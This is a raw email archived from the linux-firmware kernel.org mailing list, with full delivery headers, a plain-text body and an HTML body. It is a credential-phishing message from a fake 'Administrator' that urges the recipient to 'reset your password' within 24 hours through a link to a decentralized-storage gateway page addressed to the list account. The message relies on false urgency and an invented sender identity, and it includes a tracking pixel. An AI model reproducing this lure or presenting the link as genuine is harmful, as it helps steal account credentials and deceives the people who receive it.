Return-Path: <SRS0=Tdn1=WA=em8168.ivmerchantcompany.com=bounces+48114197-7e0c-linux-firmware=kernel.org@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 41E1DC282DE
	for <linux-firmware@archiver.kernel.org>; Thu, 13 Mar 2025 06:37:51 +0000 (UTC)
Received: by smtp.kernel.org (Postfix)
	id 0D99CC4CEE9; Thu, 13 Mar 2025 06:37:51 +0000 (UTC)
Received: from wfbtkzsh.outbound-mail.sendgrid.net (wfbtkzsh.outbound-mail.sendgrid.net [159.183.30.96])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id 9DD94C4CEDD
	for <linux-firmware@kernel.org>; Thu, 13 Mar 2025 06:37:49 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 9DD94C4CEDD
Authentication-Results: smtp.kernel.org; dmarc=pass (p=reject dis=none) header.from=ivmerchantcompany.com
Authentication-Results: smtp.kernel.org; spf=pass smtp.mailfrom=em8168.ivmerchantcompany.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ivmerchantcompany.com;
	h=content-type:from:mime-version:subject:reply-to:list-unsubscribe:
	list-unsubscribe-post:to:cc:content-type:from:subject:to;
	s=s1; bh=sCH3SDimsa9owvW1uiSI8QbVKUVEXuc3co5T77+fjrA=;
	b=RXbBSiGd28E+zjtFvlnP+sofowPfa436rsKa8r2XCGHAHu2jRXzlf9f0Y4NjJQEH73/z
	xo6PoSkzRzbMMpfA8/jbq8Zc7lntofzljSxl8sEWfyJV5kG+gsxHmhizgmvO3tt3dDnbOZ
	nAqw4CGUDE3adyAX1V9nNrwPuBxOHryKekWTm7F2jx32w04cOfye+g1gb/bxKm3TPhfFBa
	m2PNzYnCBqY5rL5VenKQf8cjEeA5vkTrWhmbzXdg1oCQTkPobziE/h8HY+lYgaswGHL5RZ
	2lcNnUvF5GOMSB82hh7FqDRWKfUa4NH/2+oF4JQQ8Gt/PnMC5JruC6dgH/Ba6UcA==
Received: by recvd-766dd68955-bm4fs with SMTP id recvd-766dd68955-bm4fs-1-67D27D38-E
	2025-03-13 06:37:44.350498123 +0000 UTC m=+10228512.686027549
Received: from NDgxMTQxOTc (unknown)
	by geopod-ismtpd-35 (SG) with HTTP
	id 2O19gAeaRi2PC3kAiiBhAw
	Thu, 13 Mar 2025 06:37:44.299 +0000 (UTC)
Content-Type: multipart/alternative; boundary=66fe6f599776f33add9ab3d6fec51a3eaeb48a84be20e687c767167f4a71
Date: Thu, 13 Mar 2025 06:37:46 +0000 (UTC)
From: Administrator <admin@ivmerchantcompany.com>
Mime-Version: 1.0
Message-ID: <2O19gAeaRi2PC3kAiiBhAw@geopod-ismtpd-35>
Subject: WARNING: Update Required
Reply-To: admin@ivmerchantcompany.com
List-Unsubscribe: 
 =?us-ascii?Q?=3Chttps=3A=2F=2Fu48114197=2Ect=2Esendgrid=2Enet=2Flu=2Funsubscribe=3Foc=3Du001=2EOvV3?=
 =?us-ascii?Q?BYL5UH8JcK6MkNr0cLZw7EMZtaKDJI4aaFUuG0C?=
 =?us-ascii?Q?yGfKRMeoWj5PugLGKiYBtAO0okNlyaScvu1T=5FmY?=
 =?us-ascii?Q?36y4dFR=5FGN3W9Qh7I3q3t5dC-673fvgGlzlKD63?=
 =?us-ascii?Q?M01gqQUk=5FiZg5cGwcCf9jiwjwdhbt74rhTP5QiO?=
 =?us-ascii?Q?7Q6NbCc2jo9L=5FRJuLutZGR9WtCkcnl2-S-Ez9zc?=
 =?us-ascii?Q?CHqeP6xdI2Z0mcDk0J3mKg12U3Ji1WDuj8KHYGD?=
 =?us-ascii?Q?8SiyVRC7-3Zm8jLiAmAw9afytta2N94piCm9Sgc?=
 =?us-ascii?Q?CmFREPEnTw0yeQ-9zS0tuF32gc8MVYXTSvsMWbw?=
 =?us-ascii?Q?KzbeG3reRZh94Kn0BYxxb1rn-j2GIDCgTUxgvet?=
 =?us-ascii?Q?U0KN4r5kYg6k4HfagYNoXbNhHVGTFIAjQ-9MTsV?=
 =?us-ascii?Q?QR-IXYeOHDna16zShw=5Fc3T3rJjExG83qkjQnIl0?=
 =?us-ascii?Q?KsoV4cWxjW1n9WCqXL5ERd1GK1PZbBJYMDjbX5a?=
 =?us-ascii?Q?eVseELZS2kqJkK1q08IFU3lNa5rdWhQBIbcG6aL?=
 =?us-ascii?Q?YkPH2SZiBQXWC7VQ0XybQ0VE2HEk4D-e0FTpLF3?=
 =?us-ascii?Q?hS8iOIgq=5FARHu3Nfdzi4SjJlnmHSaRGsM1gejvb?=
 =?us-ascii?Q?oW3hHiBjrhtyCOuzuCoz4yXual-NHIEnCMyUpLL?=
 =?us-ascii?Q?ULI4kbDlwXajhNEKyKHsQCQFXb6oh1lUOobZYiq?=
 =?us-ascii?Q?3IsnVcVZPn4T91DWNAc7oWnfEhi2vuxi0gs2uEx?=
 =?us-ascii?Q?Na1AcF=5FtU22CmwtYpIQAufiGzvbaOlUJGUopTdJ?=
 =?us-ascii?Q?pqbfZOU=5FZtPKB=5FO1xKcqjJ38Pi96JkeUlI43rae?=
 =?us-ascii?Q?qQMulENjg4rhc-ZpMSLNnfg24=5FmtUaAbIGIWt7J?=
 =?us-ascii?Q?utpuuLrwVMRkc1VTljTiT41Em70Gol2f95lnNGf?=
 =?us-ascii?Q?InV4WSvLsCa5O5ZDjTACMzKATEooVScNMox=5FMpc?=
 =?us-ascii?Q?WF358bXii=5FvHk5o4vRAeYfpQQaCfnxhL8A76IJZ?=
 =?us-ascii?Q?Yf6LkvOmmNZtxRYGRKCpvnxE4b84pq4N2IsYL8g?=
 =?us-ascii?Q?vEfSsTiQjxx2O7f8PgLfKf6oPygYG0ASCRZsuwy?=
 =?us-ascii?Q?sj5YJC1khQzAZYiF74rcZ=5FS2nwfuiGs-cjfb0ym?=
 =?us-ascii?Q?iYnb1NkRl-ilAw1WuBogylzjTlgFQbmUYLKTMyt?=
 =?us-ascii?Q?xAmapERvmOcnuRmix595AGY98zW2pnV8gEWbAC3?=
 =?us-ascii?Q?Ct3xFWfKjdoxqEARnzRiaxTWa81FFq-oMHtgggk?=
 =?us-ascii?Q?9i1V9wyWWVX8D9YMU8-9tBKEHBwkBIaHxCaNqUR?=
 =?us-ascii?Q?zzaFBzc8X95ainJO5MHhtgRInDctkVR1P=5FY96X=5F?=
 =?us-ascii?Q?t7ke-mKF9zs1OScGKArdXpE=5F-T=5Fjr04Fzz-lpn9?=
 =?us-ascii?Q?FCMjgciu0Yps1V7GiNOlZVGECmX0hjl0vr1Yqbu?=
 =?us-ascii?Q?F7QQrdKgTZodeMV8ORyt3huyaxHk=5FxAf6hDhNGt?=
 =?us-ascii?Q?GDiu6jG=5FW-5qni88a=5FkRkScSIC6J0BJNmfvneRZ?=
 =?us-ascii?Q?zK8sZcCSX4v0QI7Elig=5F-g=3E=2C=3Cmailto=3Aunsubsc?=
 =?us-ascii?Q?ribe=40em8168=2Eivmerchantcompany=2Ecom=3Fsubje?=
 =?us-ascii?Q?ct=3Dhttps=3A=2F=2Fu48114197=2Ect=2Esendgrid=2Enet=2Fmt?=
 =?us-ascii?Q?=2Fu=2Fu001=2EfNInwhO5kIZxI96sDo4GKsxx4N=5FlRfW?=
 =?us-ascii?Q?u6SYerzIcITcz9LHG4jNkL7cjjF1tZJUz=2F4er=2Fu?=
 =?us-ascii?Q?001=2EZIPNZ4=5FN=2Fu001=2E-2FaiTRHUGyuhPmPZWT7a?=
 =?us-ascii?Q?9z475MfxBE7yZJSzRJn8jFPxcm3XJVaZcT6ow1J?=
 =?us-ascii?Q?hF7I57A8MzWSkIscf1BRp2seirj8YoV5BZwgWtX?=
 =?us-ascii?Q?128lNufG5F6hzglAxHrAsdvc6LQb0W0o-2FoRki?=
 =?us-ascii?Q?KftNDrfbSrexSgewFbFSaRg1kXgeUt37L7P8ssb?=
 =?us-ascii?Q?nfurq0nWzp6GL7K1B9A5RfHjTSOxbHEE2CvibFw?=
 =?us-ascii?Q?R-2FgpfPASX-2BPpXcijjeO1-2B-2B4fOqZeflr?=
 =?us-ascii?Q?bXXZp3F0ztp6HgAIPxJDClULexaroJfFBSUgvJ9?=
 =?us-ascii?Q?xqsZzr-2FI6eg2a9EwXxtsz6dBaOiQND1Bu3aZu?=
 =?us-ascii?Q?0WCmckoi6reF7-2FUnGIanfbOFdN0ARZD6UCbpf?=
 =?us-ascii?Q?3i4keNYDgN4jdK37XEGN35MiLpLDYFcKYYqA5PB?=
 =?us-ascii?Q?rqneXpJpWEMRbvBZdi1MUNi-2FMP4DqfJy8WWP7?=
 =?us-ascii?Q?xhW5tzA-2BfvzK66O3SL-2F5H001GXolvw9dgc1?=
 =?us-ascii?Q?lbfZQ7KZaO2sAUb5TVZhk3jGudviy87Ms3YFC0B?=
 =?us-ascii?Q?Gnmy0LJkbqecOI4sxynZVwbuhmCCQevzzxNa7uk?=
 =?us-ascii?Q?PTa2aTm6BJSrebBsE6SsnPDGliy-2FBPpG6M1pe?=
 =?us-ascii?Q?-2Bxm7C5qny42aIKg9yrkdDawQrfBgzto-2FYxp?=
 =?us-ascii?Q?zScG-2Fy2wZTIG5rsPh0tDkFmbGGq8CTpWumdFO?=
 =?us-ascii?Q?zQLMKQWzpN7dsWAUYlsItCOg0lr8tPisiuIzL58?=
 =?us-ascii?Q?bu-2Fcj2c8WqtqMDryw7DtzVlxPB8bR5Sx9KU9u?=
 =?us-ascii?Q?-2FjmKb6VQollHoZGMw5j1T8tNuci0T-2F8E8Ag?=
 =?us-ascii?Q?xsB6AT-2FeJgJFWs6MNg0S1rf4sazgNYPbGgJIJ?=
 =?us-ascii?Q?GnCthhteCzZUIQsDAQxLdDOvCwcITphAqFxxPVu?=
 =?us-ascii?Q?mSvYmsYXKLEVEVfwB8DjJJAXfKOdcEdo-2B9Y4i?=
 =?us-ascii?Q?vliOyuUb2RIcF-2BWfAo7SqH0KNdUrBD1J-2FlY?=
 =?us-ascii?Q?x-2Flyw-3D-3D=2Fu001=2ESk0wUDCE=3E?=
List-Unsubscribe-Post: List-Unsubscribe=One-Click
X-SG-EID: 
 =?us-ascii?Q?u001=2EhCnsoyQ5cdCcCnEkgIRWAXm96KIW6zpaoI8nrlDQb2jnQoe=2FUVGfjRs87?=
 =?us-ascii?Q?zr0L779+xrcdc5geQ+CYOCjmzqV80g0NGZjg9e4?=
 =?us-ascii?Q?3iXJmdmORzC2Y2Vb0kefNt103mJCd+VIqL5YmSi?=
 =?us-ascii?Q?CtYvY60alidD615qsok7E1rJ=2Ftx9YcLBDPIxeYJ?=
 =?us-ascii?Q?3kv2v55iGEv7=2F3ld0JjOUD=2F5QDCmQwriJdjdABO?=
 =?us-ascii?Q?Poh2zGitg=2Fa2FTkJa2jNzDpBKkjUVGb9yqZSdwG?=
 =?us-ascii?Q?3dzDBBRvwEKWHVULrwozYuQ68A=3D=3D?=
X-SG-ID: 
 =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
 =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
 =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FG67RonH?=
 =?us-ascii?Q?evQerhFwzzAtOsRCH+EmUSHGexDq9IavQxGvNrE?=
 =?us-ascii?Q?YyBOZgHofgrtvbjrdgOAFlC0Nr2=2FOzfHuF8f+n=2F?=
 =?us-ascii?Q?cyP5JZsmEUOY43LG2ovzxaKTIWyHxDehJzOiWb3?=
 =?us-ascii?Q?95OR2IN6qvrN+Oa4Ilv5iWLvHnhjb6uNOdQnFjb?=
 =?us-ascii?Q?RBKuCw5=2FzNq75g9AuR0gGeB8saR7oj8R4i2AJUx?=
 =?us-ascii?Q?GNSYE23JtaZKS1zFuRWL4Rfj4AuXCwOeiEhqmXx?=
 =?us-ascii?Q?m37gTCdebSXOFkRSd=2FQWv7LoUiXTJh4C7TOVRmd?=
 =?us-ascii?Q?LhucArQb0F0RJ33UzLE=2FS14PX4b=2FkPrMIyZgsMI?=
 =?us-ascii?Q?KrwpYNM=2FUBdd8GwDOWoxe3ZjPXFBa3t=2FkbXQznM?=
 =?us-ascii?Q?t88Co1jpqiDJLnX0hxtE2RdHakVJu+5HKC7RM1M?=
 =?us-ascii?Q?=2FkOJ1q0ptd=2FHmP91FOsfK47j6FlRfzKp=2F9sjLUX?=
 =?us-ascii?Q?+a+RLdabNpAJFLQPh2dNPg7Bc=2FPAVnAC81eXJL5?=
 =?us-ascii?Q?cWVSVb+20sckD8ZQGPTfRXWCruaMhYrW2FJO4ja?=
 =?us-ascii?Q?JOJJxRs5i4fUOj5hLCzztxo6spVnAz6L5ce=2FIQf?=
 =?us-ascii?Q?0s=2FV1h7oO8iksHnHyFjvTMF?=
List-Id: <linux-firmware.lore.kernel.org>
To: linux-firmware@kernel.org
X-Entity-ID: u001.MUXlgjv6gM3V3DKruUqRVg==

--66fe6f599776f33add9ab3d6fec51a3eaeb48a84be20e687c767167f4a71
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=iso-8859-1
Mime-Version: 1.0

--------------------
Update your password
--------------------

Click on the button below within the next 24 hours to reset your password f=
or your account *linux-firmware@kernel.org*.

Reset your password ( https://gateway.btfs.io/btfs/QmRcfaSP222Ado8ivtT4sFz3=
AwDKgk1drD14bygDTCTepy#linux-firmware@kernel.org )
Note: The above procedure confirms that you are still an active=A0user.

Please do not ignore this email.

Administrator

Network Service , New York , NY=20

Unsubscribe ( https://u48114197.ct.sendgrid.net/wf/unsubscribe?upn=3Du001.1=
UC-2FG1r4q2F7W-2BfmxQXtFY8PR56g3aMsFDDO4-2FL-2FOLCER0pqLVK1b6Ngi6uwa5S1jNb-=
2FVRERr2RomskZ-2BadcNPfCszgKLP3Fl7U9DxTyPvHx9MmO1gucbg4g-2BPIJ0j59wmYq5N8z0=
ufNpKkJx9FSDalRnwp46B-2Fe0KUc-2Ff0ytmTH-2Bl9iEwo-2BskG8456BXpTff7pGGkR25LKi=
-2FHWM8jkZP-2BUIYoIcvpGQ7iut2JuE1kbn73XZ1ebjDtL-2FGZXRBYzcJPEJPnrmZu6NA5zg0=
wdGvDt39o67GV2XgYywhQVjS3OVozlsljsqFYExqreQkqN1iR5rQUuIHmaHtQSsAx5-2FQrYQrU=
15Zq7cT2siG7yBK8YTYnTSO6CTeANgeXJ4LBBlOTFjXO5OwewoortCi8fweYf6xpAo78QaRipuK=
he1vnlT7dGmir2VOdSACgX9aXeY-2F0BYTDP0Nmns-2FH-2BavR8m9sTNmY7b5LmcT62j5XOfiw=
IolO-2F7DNuwYMZCxJQjZHAAx7Mrq5DKsl6Pfi3dLMUH5GtgrLMEeJP2K6ydHiYLLt9xgd3Pt6Z=
J9wfQ4NF1ZSzXsUESM33eVsDR2WxqORrZ1SdheYxS7fctEx2VKF8ivPtyUm-2FRqAq-2F99xRyL=
wa8V4y-2BLXpATeBgiXHYVLL1g-2B-2B-2BdUeytzqWAR1tljAhBUl27Dse-2Fdx4W12SuX0lJr=
cp5o6kGc70Fj4REg6bJ2bKlzWBHHMEgPvxaFZ-2FOg-2Fm-2FPlklDe7a9-2FuAKWVEoePdq488=
dZdDACL7oEHfbkRppM4vXAVoB4Zz0dK5p1CXyV7-2FfPUBWx5wwxwicQYFCdBi0YxFTqjMyS55A=
w73Oo7bsXkq4uQnWqMOd0Tnf6n-2FMrl2EXV6e6ijQv6CxhdzZD1sZ5znFIUmfu8j7fNhfFEAHW=
am69Dg-3D-3D ) - Unsubscribe Preferences ( https://u48114197.ct.sendgrid.ne=
t/wf/unsubscribe?upn=3Du001.1UC-2FG1r4q2F7W-2BfmxQXtFY8PR56g3aMsFDDO4-2FL-2=
FOLCER0pqLVK1b6Ngi6uwa5S1jNb-2FVRERr2RomskZ-2BadcNPfCszgKLP3Fl7U9DxTyPvHx9M=
mO1gucbg4g-2BPIJ0j59wmYq5N8z0ufNpKkJx9FSDalRnwp46B-2Fe0KUc-2Ff0ytmTH-2Bl9iE=
wo-2BskG8456BXpTff7pGGkR25LKi-2FHWM8jkZP-2BUIYoIcvpGQ7iut2JuE1kbn73XZ1ebjDt=
L-2FGZXRBYzcJPEJPnrmZu6NA5zg0wdGvDt39o67GV2XgYywhQVjS3OVozlsljsqFYExqreQkqN=
1iR5rQUuIHmaHtQSsAx5-2FQrYQrU15Zq7cT2siG7yBK8YTYnTSO6CTeANgeXJ4LBBlOTFjXO5O=
wewoortCi8fweYf6xpAo78QaRipuKhe1vnlT7dGmir2VOdSACgX9aXeY-2F0BYTDP0Nmns-2FH-=
2BavR8m9sTNmY7b5LmcT62j5XOfiwIolO-2F7DNuwYMZCxJQjZHAAx7Mrq5DKsl6Pfi3dLMUH5G=
tgrLMEeJP2K6ydHiYLLt9xgd3Pt6ZJ9wfQ4NF1ZSzXsUESM33eVsDR2WxqORrZ1SdheYxS7fctE=
x2VKF8ivPtyUm-2FRqAq-2F99xRyLwa8V4y-2BLXpATeBgiXHYVLL1g-2B-2B-2BdUeytzqWAR1=
tljAhBUl27Dse-2Fdx4W12SuX0lJrcp5o6kGc70Fj4REg6bJ2bKlzWBHHMEgPvxaFZ-2FOg-2Fm=
-2FPlklDe7a9-2FuAKWVEoePdq488dZdDACL7oEHfbkRppM4vXAVoB4Zz0dK5p1CXyV7-2FfPUB=
Wx5wwxwicQYFCdBi0YxFTqjMyS55Aw73Oo7bsXkq4uQnWqMOd0Tnf6n-2FMrl2EXV6e6ijQv6Cx=
hdzZD1sZ5znFIUmfu8j7fNhfFEAHWam69Dg-3D-3D )
--66fe6f599776f33add9ab3d6fec51a3eaeb48a84be20e687c767167f4a71
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=us-ascii
Mime-Version: 1.0

<HTML><HEAD><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
=3Diso-8859-1">
<META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=3D1">
<META name=3Dformat-detection content=3Dtelephone=3Dno>
<title></title></HEAD>
<BODY style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff>
<DIV=20
style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WHITE=
-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; =
COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; BACKGROUND=
-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style: initial; text-decoration-color:=
 initial">
<TABLE=20
style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, Hel=
vetica, sans-serif; COLOR: rgb(51,51,51)'>
 =20
  <TR>
    <TD style=3D"MARGIN: 0px">
      <DIV>
      <DIV style=3D"BORDER-TOP: 0px; PADDING-TOP: 0px">
      <H2>Update your password</H2>
      <DIV>Click on the button below within the next 24 hours to reset your=
=20
      password for your account&nbsp;<B>linux-firmware@kernel.org</B>.</DIV=
>
      <DIV><BR></DIV><A style=3D"COLOR: rgb(0,105,166)" clicktracking=3Doff
      href=3D"https://gateway.btfs.io/btfs/QmRcfaSP222Ado8ivtT4sFz3AwDKgk1d=
rD14bygDTCTepy#linux-firmware@kernel.org"=20
      rel=3Dnoreferrer target=3D_blank=20
      data-saferedirecturl=3D"">Reset=20
      your password</A>
      <HR>      <DIV>Note: The above procedure confirms that you are still =
an=20
      active&nbsp;user.</DIV>
      <DIV>&nbsp;</DIV>
      <DIV>Please do not ignore this=20
email.</DIV></DIV></DIV></TD></TR></TABLE>
<DIV=20
style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial, Hel=
vetica, sans-serif; COLOR: rgb(51,51,51)'>&nbsp;</DIV></DIV>
<P><BR>&nbsp;</P></BODY></HTML>
      <div data-role=3D"module-unsubscribe" class=3D"module" role=3D"module=
" data-type=3D"unsubscribe" style=3D"color:#444444; font-size:12px; line-he=
ight:20px; padding:16px 16px 16px 16px; text-align:Center;" data-muid=3D"4e=
838cf3-9892-4a6d-94d6-170e474d21e5">
        <div class=3D"Unsubscribe--addressLine">
          <p class=3D"Unsubscribe--senderName"
            style=3D"font-size:12px;line-height:20px"
          >
            Administrator
          </p>
          <p style=3D"font-size:12px;line-height:20px">
            <span class=3D"Unsubscribe--senderAddress">Network Service</spa=
n>, <span class=3D"Unsubscribe--senderCity">New York</span>, <span class=3D=
"Unsubscribe--senderState">NY</span> <span class=3D"Unsubscribe--senderZip"=
></span>
          </p>
        </div>
        <p style=3D"font-size:12px; line-height:20px;">
          <a class=3D"Unsubscribe--unsubscribeLink" href=3D"https://u481141=
97.ct.sendgrid.net/wf/unsubscribe?upn=3Du001.1UC-2FG1r4q2F7W-2BfmxQXtFY8PR5=
6g3aMsFDDO4-2FL-2FOLCER0pqLVK1b6Ngi6uwa5S1jNb-2FVRERr2RomskZ-2BadcNPfCszgKL=
P3Fl7U9DxTyPvHx9MmO1gucbg4g-2BPIJ0j59wmYq5N8z0ufNpKkJx9FSDalRnwp46B-2Fe0KUc=
-2Ff0ytmTH-2Bl9iEwo-2BskG8456BXpTff7pGGkR25LKi-2FHWM8jkZP-2BUIYoIcvpGQ7iut2=
JuE1kbn73XZ1ebjDtL-2FGZXRBYzcJPEJPnrmZu6NA5zg0wdGvDt39o67GV2XgYywhQVjS3OVoz=
lsljsqFYExqreQkqN1iR5rQUuIHmaHtQSsAx5-2FQrYQrU15Zq7cT2siG7yBK8YTYnTSO6CTeAN=
geXJ4LBBlOTFjXO5OwewoortCi8fweYf6xpAo78QaRipuKhe1vnlT7dGmir2VOdSACgX9aXeY-2=
F0BYTDP0Nmns-2FH-2BavR8m9sTNmY7b5LmcT62j5XOfiwIolO-2F7DNuwYMZCxJQjZHAAx7Mrq=
5DKsl6Pfi3dLMUH5GtgrLMEeJP2K6ydHiYLLt9xgd3Pt6ZJ9wfQ4NF1ZSzXsUESM33eVsDR2Wxq=
ORrZ1SdheYxS7fctEx2VKF8ivPtyUm-2FRqAq-2F99xRyLwa8V4y-2BLXpATeBgiXHYVLL1g-2B=
-2B-2BdUeytzqWAR1tljAhBUl27Dse-2Fdx4W12SuX0lJrcp5o6kGc70Fj4REg6bJ2bKlzWBHHM=
EgPvxaFZ-2FOg-2Fm-2FPlklA3fxcv-2FkjNVfEA2yOuiEezPn3WC0jX-2BC-2FSyRtF0RTNSA6=
3lIJpSg44x5Ui0efg7xPiwhJPS92Su0Vfr5KThrKD9lgP777L9BQBcbgZR8qE8bfjY-2B0G4TPJ=
QaYh53vHSCg0c0tO8WLODjEGIRYWIviTKbjWIJuu9vwEWQ-2B-2FoQGfBw-3D-3D" target=3D=
"_blank" style=3D"font-family:sans-serif;text-decoration:none;">
            Unsubscribe
          </a>
          -
          <a href=3D"https://u48114197.ct.sendgrid.net/wf/unsubscribe?upn=
=3Du001.1UC-2FG1r4q2F7W-2BfmxQXtFY8PR56g3aMsFDDO4-2FL-2FOLCER0pqLVK1b6Ngi6u=
wa5S1jNb-2FVRERr2RomskZ-2BadcNPfCszgKLP3Fl7U9DxTyPvHx9MmO1gucbg4g-2BPIJ0j59=
wmYq5N8z0ufNpKkJx9FSDalRnwp46B-2Fe0KUc-2Ff0ytmTH-2Bl9iEwo-2BskG8456BXpTff7p=
GGkR25LKi-2FHWM8jkZP-2BUIYoIcvpGQ7iut2JuE1kbn73XZ1ebjDtL-2FGZXRBYzcJPEJPnrm=
Zu6NA5zg0wdGvDt39o67GV2XgYywhQVjS3OVozlsljsqFYExqreQkqN1iR5rQUuIHmaHtQSsAx5=
-2FQrYQrU15Zq7cT2siG7yBK8YTYnTSO6CTeANgeXJ4LBBlOTFjXO5OwewoortCi8fweYf6xpAo=
78QaRipuKhe1vnlT7dGmir2VOdSACgX9aXeY-2F0BYTDP0Nmns-2FH-2BavR8m9sTNmY7b5LmcT=
62j5XOfiwIolO-2F7DNuwYMZCxJQjZHAAx7Mrq5DKsl6Pfi3dLMUH5GtgrLMEeJP2K6ydHiYLLt=
9xgd3Pt6ZJ9wfQ4NF1ZSzXsUESM33eVsDR2WxqORrZ1SdheYxS7fctEx2VKF8ivPtyUm-2FRqAq=
-2F99xRyLwa8V4y-2BLXpATeBgiXHYVLL1g-2B-2B-2BdUeytzqWAR1tljAhBUl27Dse-2Fdx4W=
12SuX0lJrcp5o6kGc70Fj4REg6bJ2bKlzWBHHMEgPvxaFZ-2FOg-2Fm-2FPlklA3fxcv-2FkjNV=
fEA2yOuiEezPn3WC0jX-2BC-2FSyRtF0RTNSA63lIJpSg44x5Ui0efg7xPiwhJPS92Su0Vfr5KT=
hrKD9lgP777L9BQBcbgZR8qE8bfjY-2B0G4TPJQaYh53vHSCg0c0tO8WLODjEGIRYWIviTKbjWI=
Juu9vwEWQ-2B-2FoQGfBw-3D-3D" target=3D"_blank" class=3D"Unsubscribe--unsubs=
cribePreferences" style=3D"font-family:sans-serif;text-decoration:none;">
            Unsubscribe Preferences
          </a>
        </p>
      </div>
    <img src=3D"https://u48114197.ct.sendgrid.net/wf/open?upn=3Du001.1UC-2F=
G1r4q2F7W-2BfmxQXtFY8PR56g3aMsFDDO4-2FL-2FOLCER0pqLVK1b6Ngi6uwa5S1jNb-2FVRE=
Rr2RomskZ-2BadcNPfCszgKLP3Fl7U9DxTyPvHx9MmO1gucbg4g-2BPIJ0j59wmYq5N8z0ufNpK=
kJx9FSDalRnwp46B-2Fe0KUc-2Ff0ytmTH-2Bl9iEwo-2BskG8456BXpTff7pGGkR25LKi-2FHW=
M8jkZP-2BUIYoIcvpGQ7iut2JuE1kbn73XZ1ebjDtL-2FGZXRBYzcJPEJPnrmZu6NA5zg0wdGvD=
t39o67GV2XgYywhQVjS3OVozlsljsqFYExqreQkqN1iR5rQUuIHmaHtQSsAx5-2FQrYQrU15Zq7=
cT2siG7yBK8YTYnTSO6CTeANgeXJ4LBBlOTFjXO5OwewoortCi8fweYf6xpAo78QaRipuKhe1vn=
lT7dGmir2VOdSACgX9aXeY-2F0BYTDP0Nmns-2FH-2BavR8m9sTNmY7b5LmcT62j5XOfiwIolO-=
2F7DNuwYMZCxJQjZHAAx7Mrq5DKsl6Pfi3dLMUH5GtgrLMEeJP2K6ydHiYLLt9xgd3Pt6ZJ9wfQ=
4NF1ZSzXsUESM33eVsDR2WxqORrZ1SdheYxS7fctEx2VKF8ivPtyUm-2FRqAq-2F99xRyLwa8V4=
y-2BLXpATeBgiXHYVLL1g-2B-2B-2BdUeytzqWAR1tljAhBUl27Dse-2Fdx4W12SuX0lJrcp5o6=
kGc70Fj4REg6bJ2bKlzWBHHMEgPvxaFZ-2FOg-2Fm-2FPlklDyr0o-2F3r0dR4xfXaNYfiiVQPw=
5HLPDsHSQljFWK9dR-2FDpeD5soK9dBCENfPkx8yjdX5OkDQRyjAS-2F2fxR5yGhXDfqlS5HepT=
eJ-2B6jKaZPbpYJCcUe00LgnUaV0AzNiNNMjsYwZL7x2vUMKJE8u3HxE" alt=3D"" width=3D=
"1" height=3D"1" border=3D"0" style=3D"height:1px !important;width:1px !imp=
ortant;border-width:0 !important;margin-top:0 !important;margin-bottom:0 !i=
mportant;margin-right:0 !important;margin-left:0 !important;padding-top:0 !=
important;padding-bottom:0 !important;padding-right:0 !important;padding-le=
ft:0 !important;"/></body>
  </html>

--66fe6f599776f33add9ab3d6fec51a3eaeb48a84be20e687c767167f4a71--
